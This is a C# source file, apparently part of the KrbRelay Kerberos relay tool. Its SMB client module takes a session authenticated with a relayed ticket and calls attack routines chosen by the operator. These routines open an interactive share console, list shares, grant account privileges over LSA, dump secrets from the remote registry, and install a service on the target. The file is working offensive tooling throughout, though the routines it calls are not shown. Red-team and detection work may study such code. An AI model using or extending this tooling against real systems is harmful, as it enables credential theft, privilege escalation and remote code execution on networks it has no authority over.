using System;
using System.Linq;
using static KrbRelay.Program;

namespace KrbRelay.Clients
{
    public class Smb
    {
        public static void Connect()
        {
            State.UpdateApRep1(smbClient.Login(State.ticket, out bool success));

            if (success)
            {
                Console.WriteLine("[+] SMB session established");

                try
                {
                    if (State.attacks.Keys.Contains("console"))
                    {
                        Attacks.Smb.Shares.smbConsole(smbClient);
                    }
                    if (State.attacks.Keys.Contains("list"))
                    {
                        Attacks.Smb.Shares.listShares(smbClient);
                    }
                    if (State.attacks.Keys.Contains("add-privileges"))
                    {
                        Attacks.Smb.LSA.AddAccountRights(
                            smbClient,
                            State.attacks["add-privileges"]
                        );
                    }
                    if (State.attacks.Keys.Contains("secrets"))
                    {
                        Attacks.Smb.RemoteRegistry.secretsDump(smbClient, false);
                    }
                    if (State.attacks.Keys.Contains("service-add"))
                    {
                        string arg1 = State.attacks["service-add"].Split(new[] { ' ' }, 2)[0];
                        string arg2 = State.attacks["service-add"].Split(new[] { ' ' }, 2)[1];
                        Attacks.Smb.ServiceManager.serviceInstall(smbClient, arg1, arg2);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }

                smbClient.Logoff();
                smbClient.Disconnect();
            }
            else
            {
                Console.WriteLine("[*] apRep1: {0}", Helpers.ByteArrayToHex(State.apRep1));
            }
        }
    }
}
